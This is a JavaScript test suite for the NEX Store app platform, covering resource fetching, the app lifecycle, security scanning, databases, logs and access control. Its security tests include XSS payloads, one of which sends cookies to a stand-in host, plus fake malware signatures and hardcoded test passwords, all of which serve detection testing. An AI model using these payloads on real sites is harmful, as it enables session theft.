/**
 * © 2026 NEX STORE & DEVTECHS001 LABS. ALL RIGHTS RESERVED.
 * STRICTLY PROPRIETARY & CONFIDENTIAL — DO NOT SHARE, REDISTRIBUTE, OR PIRATE THIS CODE.
 *
 * Comprehensive Automated Verification & Integration Test Engine covering:
 * 1. Fetching Netlify, GitHub, PyPI & NPM App Resources
 * 2. Uploading, Publishing, Installing, Sandboxing & Uninstalling Apps
 * 3. App Security Systems (5-Stage Anti-Malware, XSS Shield, IP Firewall, Security Reports)
 * 4. Server Nodes, Multi-Cloud Hosting (Netlify/Render) & Dual-Engine SQLite + MongoDB
 * 5. System Logs (Inventory Logs, Terminal CLI Logs, Activity Events, Security Audit Logs)
 * 6. Admins (.env Root Admin), Developers & Users RBAC Authentication & Access Control
 */

import assert from 'node:assert/strict';
import crypto from 'node:crypto';
import {
  db,
  seedDatabase,
  formatProductRow,
  recordActivityEvent,
  recordSecurityEvent,
  recordTerminalLog
} from './db.js';
import { renderAppBannerSvg, inspectAndFetchUrlResources } from './appArtAndFetcher.js';
import { renderSandboxedAppHtml } from './appSandboxRuntime.js';
import {
  getEnvAdminConfig,
  getHostingEnvAndBlueprintsConfig,
  hashPassword,
  createSessionToken,
  verifySessionToken,
  detectXssAttempt,
  sanitizeObjectPayloads,
  verifyAppRealnessAndMalware
} from './envAndSecurity.js';
import {
  getMongoClusterStatus,
  queryMongoCollection,
  insertMongoBsonDocument
} from './mongoEngine.js';
import {
  getProductArtUrl,
  getAppArtUrl,
  getAppVisualResources,
  hydrateProduct,
  hydrateApp
} from '../src/utils/storeEngine.js';

export async function runAllVerificationSuites() {
  const startedAt = performance.now();
  const suites = [];

  async function runSuite(suiteId, title, category, fn) {
    const suiteStart = performance.now();
    const cases = [];

    async function testCase(name, assertionFn) {
      const caseStart = performance.now();
      try {
        const detail = await assertionFn();
        cases.push({
          name,
          status: 'PASSED',
          durationMs: Number((performance.now() - caseStart).toFixed(2)),
          detail: detail || 'Assertion verified'
        });
      } catch (err) {
        cases.push({
          name,
          status: 'FAILED',
          durationMs: Number((performance.now() - caseStart).toFixed(2)),
          detail: err.message || 'Assertion failed',
          error: err.stack || err.message
        });
        throw err;
      }
    }

    await fn(testCase);

    suites.push({
      id: suiteId,
      title,
      category,
      passedCount: cases.filter((c) => c.status === 'PASSED').length,
      failedCount: cases.filter((c) => c.status === 'FAILED').length,
      totalCount: cases.length,
      durationMs: Number((performance.now() - suiteStart).toFixed(2)),
      status: cases.every((c) => c.status === 'PASSED') ? 'PASSED' : 'FAILED',
      cases
    });
  }

  // Ensure database is seeded before running suites
  seedDatabase();

  // ============================================================================
  // SUITE 1: FETCHING NETLIFY, VERCEL, GITHUB & PACKAGE APP RESOURCES
  // ============================================================================
  await runSuite(
    'suite-netlify-resources',
    '1. Fetching Netlify & Multi-Source App Resources',
    'Netlify & Resource Extractor',
    async (test) => {
      await test('Fetch live Netlify app URL metadata, preview banner & resource manifest', async () => {
        const inspected = await inspectAndFetchUrlResources('https://quantum-circuit-studio.netlify.app');
        assert.equal(inspected.source_provider, 'Netlify');
        assert.ok(inspected.name.toLowerCase().includes('quantum'));
        assert.ok(Array.isArray(inspected.resources) && inspected.resources.length >= 4);
        assert.ok(inspected.resources.some((r) => r.name === 'og-preview-banner.svg'));
        assert.ok(inspected.resources.some((r) => r.name === 'nex-app-manifest.json'));
        assert.ok(inspected.resources.some((r) => r.name === 'nex-copyright-drm.cert'));
        assert.ok(inspected.image_url && inspected.image_url.includes('/api/app-art/'));
        return `Extracted "${inspected.name}" (${inspected.resources.length} resources, provider=${inspected.source_provider})`;
      });

      await test('Fetch NEX Store Pro production Netlify URL (https://nex-store-pro.netlify.app)', async () => {
        const inspected = await inspectAndFetchUrlResources('https://nex-store-pro.netlify.app');
        assert.equal(inspected.source_provider, 'Netlify');
        assert.ok(inspected.live_url.includes('nex-store-pro.netlify.app'));
        assert.ok(inspected.ai_analysis && inspected.ai_analysis.architectureScore === 99);
        assert.ok(Array.isArray(inspected.ai_analysis.recommendedAutomations) && inspected.ai_analysis.recommendedAutomations.length === 4);
        assert.ok(inspected.drmNotice.includes('DO NOT SHARE'));
        return `Verified ${inspected.live_url} with ${inspected.ai_analysis.recommendedAutomations.length} AI automations & DRM lock`;
      });

      await test('Generate 4-view HD client-side App Visual Resources (Banner, UI, Arch, Spec)', async () => {
        const sampleApp = db.prepare('SELECT * FROM apps LIMIT 1').get();
        const resources = getAppVisualResources(sampleApp);
        assert.equal(resources.length, 4);
        for (const resItem of resources) {
          assert.ok(resItem.url.startsWith('data:image/svg+xml;charset=utf-8,'));
          assert.equal(resItem.resolution, '960×500 HD');
        }
        const hydrated = hydrateApp(sampleApp);
        assert.ok(hydrated.image_url.startsWith('data:image/svg+xml;charset=utf-8,'));
        return `Generated 4 HD SVG resources (${resources.map((r) => r.id).join(', ')})`;
      });

      await test('Generate 4-angle HD client-side Product CAD & Studio Images', async () => {
        const sampleProd = formatProductRow(db.prepare('SELECT * FROM products LIMIT 1').get());
        for (const angle of ['hero', 'detail', 'blueprint', 'spec']) {
          const url = getProductArtUrl(sampleProd, { view: angle });
          assert.ok(url.startsWith('data:image/svg+xml;charset=utf-8,'));
        }
        const hydrated = hydrateProduct(sampleProd);
        assert.ok(hydrated.image_url.startsWith('data:image/svg+xml;charset=utf-8,'));
        return `Verified 4-angle CAD SVG data URIs for ${sampleProd.sku}`;
      });
    }
  );

  // ============================================================================
  // SUITE 2: UPLOADING, PUBLISHING, MODIFYING, INSTALLING & SANDBOXING APPS
  // ============================================================================
  await runSuite(
    'suite-app-upload-lifecycle',
    '2. Uploading Apps, Sandbox Runtime & Package Lifecycle',
    'App Store & Sandbox',
    async (test) => {
      const testAppId = `app-test-netlify-${Date.now().toString(36)}`;

      await test('Upload & publish a new Netlify app into SQLite apps table', async () => {
        const now = new Date().toISOString();
        const sha = crypto.createHash('sha256').update(`${testAppId}:1.2.0`).digest('hex');
        const resources = [
          { type: 'image', name: 'og-preview-banner.svg', url: `/api/app-art/${testAppId}.svg`, size: '28 KB' },
          { type: 'bundle', name: 'netlify-edge-bundle.js', url: 'https://test-app.netlify.app', size: '1.4 MB' }
        ];
        db.prepare(`
          INSERT INTO apps (
            id, name, description, version, category, language, platforms_json,
            rating, reviews_count, downloads, size, developer, icon, license, price,
            is_featured, is_verified, source_provider, live_url, repo_url,
            sha256_hash, security_score, permissions_json, image_url, resources_json,
            ai_capabilities_json, developer_email, developer_website, developer_bio,
            package_type, install_command, system_requirements_json, changelog, created_at
          ) VALUES (?, ?, ?, ?, ?, ?, ?, 5.0, 1, 10, '14.2 MB', ?, '🚀', 'Proprietary', 'Free', 0, 1, 'Netlify', ?, ?, ?, 99, '[]', ?, ?, '[]', ?, ?, ?, 'app', ?, '{}', 'Initial release', ?)
        `).run(
          testAppId,
          'Netlify Edge Synth Studio',
          'Automated test app uploaded from Netlify Edge with real-time WebAudio DSP.',
          '1.2.0',
          'web',
          'typescript',
          JSON.stringify(['web', 'linux', 'macos']),
          'aether_labs',
          'https://edge-synth-studio.netlify.app',
          'https://github.com/devTechs001/nex-store',
          sha,
          `/api/app-art/${testAppId}.svg`,
          JSON.stringify(resources),
          'elena@aetherlabs.io',
          'https://edge-synth-studio.netlify.app',
          'Verified Netlify Publisher',
          `nex install ${testAppId} --verify-sha256`,
          now
        );

        const inserted = db.prepare('SELECT * FROM apps WHERE id = ?').get(testAppId);
        assert.ok(inserted && inserted.name === 'Netlify Edge Synth Studio');
        assert.equal(inserted.source_provider, 'Netlify');
        return `Published ${inserted.id} v${inserted.version} by @${inserted.developer}`;
      });

      await test('Install uploaded app into SQLite app_installs (/opt/nex-apps/:id)', async () => {
        const appRow = db.prepare('SELECT * FROM apps WHERE id = ?').get(testAppId);
        const now = new Date().toISOString();
        db.prepare('UPDATE apps SET downloads = downloads + 1 WHERE id = ?').run(testAppId);
        db.prepare(`
          INSERT OR REPLACE INTO app_installs (
            id, app_id, app_name, version, source_provider, install_path, sandbox_url, sha256_verified, status, installed_at
          ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, 'INSTALLED', ?)
        `).run(
          `inst-${testAppId}`,
          testAppId,
          appRow.name,
          appRow.version,
          appRow.source_provider,
          `/opt/nex-apps/${testAppId}`,
          `/api/sandbox/${testAppId}`,
          appRow.sha256_hash,
          now
        );

        const installRow = db.prepare('SELECT * FROM app_installs WHERE app_id = ?').get(testAppId);
        assert.ok(installRow && installRow.status === 'INSTALLED');
        assert.equal(installRow.install_path, `/opt/nex-apps/${testAppId}`);
        return `Mounted at ${installRow.install_path} -> ${installRow.sandbox_url}`;
      });

      await test('Render isolated HTML5/Canvas/WebAudio Sandbox Runtime for installed app', async () => {
        const appRow = db.prepare('SELECT * FROM apps WHERE id = ?').get(testAppId);
        const html = renderSandboxedAppHtml(appRow);
        assert.ok(html.includes('<canvas id="sandbox-canvas"'));
        assert.ok(html.includes('nex-sandbox:telemetry'));
        assert.ok(html.includes(appRow.name));
        const bannerSvg = renderAppBannerSvg(appRow);
        assert.ok(bannerSvg.includes('<svg') && bannerSvg.includes('DRM PROTECTED'));
        return `Verified HTML5 Sandbox (${html.length} bytes) & SVG Banner`;
      });

      await test('Uninstall & clean up test app from app_installs & apps', async () => {
        db.prepare('DELETE FROM app_installs WHERE app_id = ?').run(testAppId);
        db.prepare('DELETE FROM apps WHERE id = ?').run(testAppId);
        const check = db.prepare('SELECT * FROM apps WHERE id = ?').get(testAppId);
        assert.equal(check, undefined);
        return `Unmounted and cleaned up ${testAppId}`;
      });
    }
  );

  // ============================================================================
  // SUITE 3: APP SECURITY SYSTEMS (ANTI-MALWARE, XSS SHIELD, FIREWALL, REPORTS)
  // ============================================================================
  await runSuite(
    'suite-app-security-systems',
    '3. App Security Systems (5-Stage Anti-Malware, XSS, IP Firewall & Reports)',
    'Security & Anti-Malware',
    async (test) => {
      await test('Verify clean app passes all 5 stages of Realness, Compatibility & Anti-Malware Scan', async () => {
        const cleanApp = db.prepare('SELECT * FROM apps LIMIT 1').get();
        const report = verifyAppRealnessAndMalware(cleanApp, 'linux-x86_64');
        assert.equal(report.malwareFree, true);
        assert.equal(report.verifiedReal, true);
        assert.equal(report.stages.length, 5);
        assert.equal(report.detectedThreats.length, 0);
        return `5/5 stages PASSED • Security Score ${report.securityScore}/100 • SHA-256 ${report.sha256.slice(0, 12)}...`;
      });

      await test('Block & quarantine malicious app containing trojan/crypto-miner signatures', async () => {
        const maliciousApp = {
          id: 'app-malware-test',
          name: 'Fake Crypto Booster',
          version: '0.1.0',
          developer: 'unverified_actor',
          source_provider: 'Unknown',
          description: 'Injects eval(atob("malicious")) and connects to stratum+tcp://pool.evil:3333 with keylogger',
          live_url: 'https://evil.example.com'
        };
        const report = verifyAppRealnessAndMalware(maliciousApp, 'linux-x86_64');
        assert.equal(report.malwareFree, false);
        assert.equal(report.verifiedReal, false);
        assert.equal(report.securityScore, 0);
        assert.ok(report.detectedThreats.length >= 3);
        assert.equal(report.stages[1].status, 'BLOCKED');
        assert.equal(report.stages[4].status, 'QUARANTINED');
        return `Blocked ${report.detectedThreats.length} malware vectors: ${report.detectedThreats.join(', ')}`;
      });

      await test('Detect & neutralize XSS injection payloads (<script>, javascript:, onerror=)', async () => {
        const attack1 = detectXssAttempt('<script>fetch("https://steal.io?c="+document.cookie)</script>');
        const attack2 = detectXssAttempt('<img src=x onerror=alert(1)>');
        const attack3 = detectXssAttempt('javascript:eval(window.location)');
        assert.ok(attack1?.detected && attack2?.detected && attack3?.detected);

        const dirtyObj = {
          title: 'Normal Title <script>evil()</script>',
          nested: { bio: 'Click javascript:alert(1) onerror=hack()' }
        };
        const cleanObj = sanitizeObjectPayloads(dirtyObj);
        assert.ok(!cleanObj.title.includes('<script>'));
        assert.ok(!cleanObj.nested.bio.includes('javascript:'));
        assert.ok(!cleanObj.nested.bio.includes('onerror='));
        return 'Detected 3 XSS vectors and recursively sanitized nested payload object';
      });

      await test('Verify Zero-Trust IP Firewall Blocklist (blocked_ips) & Security Reports (security_reports)', async () => {
        const testIp = '198.51.100.99';
        const blkId = `blk-test-${Date.now().toString(36)}`;
        db.prepare(`
          INSERT OR REPLACE INTO blocked_ips (
            id, ip_address, cidr_range, reason, threat_level, blocked_by, hits_blocked, auto_automation_rule, status, created_at
          ) VALUES (?, ?, ?, 'Automated Test XSS/SQLi Block', 'critical', 'Root Admin (.env)', 5, 'WAF Test Rule', 'ACTIVE_BLOCK', ?)
        `).run(blkId, testIp, `${testIp}/32`, new Date().toISOString());

        const foundIp = db.prepare('SELECT * FROM blocked_ips WHERE id = ?').get(blkId);
        assert.ok(foundIp && foundIp.ip_address === testIp);
        db.prepare('DELETE FROM blocked_ips WHERE id = ?').run(blkId);

        const reports = db.prepare('SELECT * FROM security_reports').all();
        assert.ok(reports.length >= 3);
        return `Verified IP Firewall block/unblock (${testIp}) & ${reports.length} security reports`;
      });
    }
  );

  // ============================================================================
  // SUITE 4: SERVER NODES, CLOUD HOSTING (NETLIFY/RENDER) & MONGODB + SQLITE
  // ============================================================================
  await runSuite(
    'suite-servers-cloud-db',
    '4. Edge Servers, Netlify/Render Cloud Hosting & Dual-Engine SQLite + MongoDB',
    'Servers & Cloud Infrastructure',
    async (test) => {
      await test('Verify Edge Server Nodes telemetry & provisioning in server_nodes table', async () => {
        const nodes = db.prepare('SELECT * FROM server_nodes ORDER BY latency_ms ASC').all();
        assert.ok(nodes.length >= 6);
        const onlineNodes = nodes.filter((n) => n.status.toLowerCase() === 'online');
        assert.ok(onlineNodes.length >= 5);
        return `${onlineNodes.length}/${nodes.length} edge server nodes ONLINE (lowest latency: ${nodes[0].latency_ms}ms in ${nodes[0].region})`;
      });

      await test('Verify Netlify (nex-store-pro.netlify.app) & Render (nex-store-lj5j.onrender.com) config & deployments', async () => {
        const envCfg = getHostingEnvAndBlueprintsConfig();
        assert.ok(envCfg.renderVars.length >= 18);
        assert.ok(envCfg.netlifyVars.length >= 12);
        assert.ok(envCfg.netlifyToml.includes('https://nex-store-lj5j.onrender.com/api/:splat'));
        assert.ok(envCfg.renderYaml.includes('nex-store-lj5j'));

        const deployments = db.prepare('SELECT * FROM hosting_deployments').all();
        assert.ok(deployments.some((d) => d.deploy_url.includes('nex-store-pro.netlify.app')));
        assert.ok(deployments.some((d) => d.deploy_url.includes('nex-store-lj5j.onrender.com')));
        return `Verified ${envCfg.renderVars.length} Render vars, ${envCfg.netlifyVars.length} Netlify vars & live deployment records`;
      });

      await test('Verify Dual-Engine SQLite 3 WAL (28 Tables) + MongoDB Atlas BSON Document Engine', async () => {
        const tables = db
          .prepare("SELECT name FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%'")
          .all()
          .map((r) => r.name);
        assert.ok(tables.length >= 28);

        const mongoStatus = getMongoClusterStatus(db, tables);
        assert.equal(mongoStatus.connected, true);
        assert.equal(mongoStatus.dbName, 'nex_store');
        assert.equal(mongoStatus.nodes.length, 3);

        const queryRes = queryMongoCollection(db, tables, 'products', { category: 'compute' }, 10);
        assert.ok(queryRes.matchedCount >= 1);
        assert.ok(queryRes.documents[0]._id?.$oid);

        const insertedDoc = insertMongoBsonDocument(db, tables, 'products', {
          name: 'Test BSON Neural Card',
          category: 'compute',
          price: 999
        });
        assert.ok(insertedDoc._id?.$oid && insertedDoc._id.$oid.length === 24);
        return `Verified ${tables.length} SQLite tables + MongoDB Atlas (${mongoStatus.totalDocuments} BSON docs, ObjectId=${insertedDoc._id.$oid})`;
      });
    }
  );

  // ============================================================================
  // SUITE 5: SYSTEM LOGS (INVENTORY, TERMINAL CLI, ACTIVITY & SECURITY LOGS)
  // ============================================================================
  await runSuite(
    'suite-system-logs',
    '5. System Logs (Inventory, Terminal CLI, Activity & Security Audit Logs)',
    'Observability & Logs',
    async (test) => {
      await test('Record & verify Terminal CLI execution logs (terminal_logs & terminal_scripts)', async () => {
        const logEntry = recordTerminalLog({
          command: 'nex test --suite=all --verify-drm',
          output: '[TEST-RUNNER] Verified 28 SQLite tables, MongoDB BSON cluster, and SHA-256 sandbox.',
          exit_code: 0,
          actor: 'automated-test@nex-store',
          duration_ms: 1.8
        });
        assert.ok(logEntry.id && logEntry.exit_code === 0);
        const totalLogs = db.prepare('SELECT COUNT(*) as c FROM terminal_logs').get().c;
        const totalScripts = db.prepare('SELECT COUNT(*) as c FROM terminal_scripts').get().c;
        assert.ok(totalLogs >= 4 && totalScripts >= 4);
        return `Recorded CLI log ${logEntry.id} (${totalLogs} terminal logs, ${totalScripts} .nexsh playbooks)`;
      });

      await test('Record & verify Security Audit Logs (security_events) & Live Activity Stream (activity_events)', async () => {
        const secEv = recordSecurityEvent({
          event_type: 'automated_security_test',
          severity: 'low',
          source_ip: '127.0.0.1',
          target_resource: 'Test Suite Runner',
          action_taken: 'VERIFIED',
          description: 'Automated verification of WAF, XSS sanitizer, and RBAC guards.'
        });
        const actEv = recordActivityEvent({
          event_type: 'stock_update',
          title: 'Automated Test Suite Executed',
          message: 'All 6 NEX Store verification suites executed against SQLite + MongoDB.',
          meta: { secEventId: secEv.id }
        });
        assert.ok(secEv.id && actEv.id);
        return `Recorded security event ${secEv.id} & activity event ${actEv.id}`;
      });

      await test('Verify Inventory Audit Logs (inventory_logs) integrity across hardware SKUs', async () => {
        const invLogs = db.prepare('SELECT * FROM inventory_logs ORDER BY created_at DESC LIMIT 20').all();
        assert.ok(invLogs.length >= 12);
        assert.ok(invLogs[0].product_id && invLogs[0].product_name);
        return `Verified ${invLogs.length} recent inventory audit log entries`;
      });
    }
  );

  // ============================================================================
  // SUITE 6: ADMINS (.ENV), DEVELOPERS & USERS RBAC AUTHENTICATION & PERMISSIONS
  // ============================================================================
  await runSuite(
    'suite-rbac-admin-dev-user',
    '6. Admins (.env), Developers & Users RBAC Authentication & Permissions',
    'RBAC & Identity',
    async (test) => {
      await test('Authenticate Root Admin strictly via .env credentials with unrestricted ["*"] permissions', async () => {
        const envAdmin = getEnvAdminConfig();
        assert.equal(envAdmin.envLoaded, true);
        assert.equal(envAdmin.username, 'nex_root_admin');
        assert.equal(envAdmin.email, 'admin@nexstore.dev');
        assert.ok(envAdmin.password.length >= 8);

        const adminAccount = {
          id: 'admin-root-env',
          username: envAdmin.username,
          email: envAdmin.email,
          role: 'admin',
          permissions: ['*'],
          source: '.env'
        };
        const token = createSessionToken(adminAccount);
        const verified = verifySessionToken(token, db);
        assert.ok(verified && verified.role === 'admin' && verified.source === '.env');
        assert.deepEqual(verified.permissions, ['*']);

        // Also verify master token direct bearer auth
        const masterVerified = verifySessionToken(`Bearer ${envAdmin.masterToken}`, db);
        assert.ok(masterVerified && masterVerified.role === 'admin');
        return `Verified Root Admin (@${verified.username}) via .env session token & master token`;
      });

      await test('Authenticate Developer accounts (@aether_labs & @rustcore_sys) with scoped permissions', async () => {
        const devRow = db.prepare("SELECT * FROM user_accounts WHERE username = 'aether_labs'").get();
        assert.ok(devRow && devRow.role === 'developer');
        assert.equal(devRow.password_hash, hashPassword('DevPass2026!'));

        const devToken = createSessionToken(devRow);
        const verifiedDev = verifySessionToken(devToken, db);
        assert.ok(verifiedDev && verifiedDev.role === 'developer');
        assert.equal(verifiedDev.username, 'aether_labs');
        assert.ok(verifiedDev.permissions.includes('publish_app'));
        assert.ok(!verifiedDev.permissions.includes('*'));
        return `Verified Developer @${verifiedDev.username} (${verifiedDev.company}) with scoped permissions: ${verifiedDev.permissions.join(', ')}`;
      });

      await test('Authenticate Shopper/User account (@amara_nbo) & verify non-admin role scoping', async () => {
        const userRow = db.prepare("SELECT * FROM user_accounts WHERE username = 'amara_nbo'").get();
        assert.ok(userRow && userRow.role === 'user');
        assert.equal(userRow.password_hash, hashPassword('Shopper2026!'));

        const userToken = createSessionToken(userRow);
        const verifiedUser = verifySessionToken(userToken, db);
        assert.ok(verifiedUser && verifiedUser.role === 'user');
        assert.ok(verifiedUser.permissions.includes('purchase_hardware'));
        assert.ok(!verifiedUser.permissions.includes('*'));
        return `Verified User @${verifiedUser.username} with role="${verifiedUser.role}"`;
      });

      await test('Enforce cross-developer & admin-only RBAC boundaries (Root Admin vs Developer vs User)', async () => {
        const adminActor = verifySessionToken(
          createSessionToken({ id: 'admin-root-env', role: 'admin', username: 'nex_root_admin' }),
          db
        );
        const aetherActor = verifySessionToken(
          createSessionToken(db.prepare("SELECT * FROM user_accounts WHERE username = 'aether_labs'").get()),
          db
        );
        const rustcoreDeployment = db
          .prepare("SELECT * FROM hosting_deployments WHERE owner_username = 'rustcore_sys' LIMIT 1")
          .get();

        // Developer @aether_labs cannot modify @rustcore_sys's deployment, while Root Admin can
        const canAetherModifyRustcore =
          aetherActor.role === 'admin' ||
          aetherActor.username.toLowerCase() === rustcoreDeployment.owner_username.toLowerCase();
        const canAdminModifyRustcore =
          adminActor.role === 'admin' ||
          adminActor.username.toLowerCase() === rustcoreDeployment.owner_username.toLowerCase();

        assert.equal(canAetherModifyRustcore, false, 'Developer must be blocked from modifying another developer deployment');
        assert.equal(canAdminModifyRustcore, true, 'Root Admin (.env) must be allowed to modify any deployment');
        return 'Verified RBAC enforcement: Developer blocked from cross-owner mutation; Root Admin (.env) permitted';
      });
    }
  );

  const totalTests = suites.reduce((sum, s) => sum + s.totalCount, 0);
  const totalPassed = suites.reduce((sum, s) => sum + s.passedCount, 0);
  const totalFailed = suites.reduce((sum, s) => sum + s.failedCount, 0);

  return {
    status: totalFailed === 0 ? 'ALL_PASSED' : 'FAILED',
    totalSuites: suites.length,
    totalTests,
    totalPassed,
    totalFailed,
    durationMs: Number((performance.now() - startedAt).toFixed(2)),
    executedAt: new Date().toISOString(),
    suites
  };
}
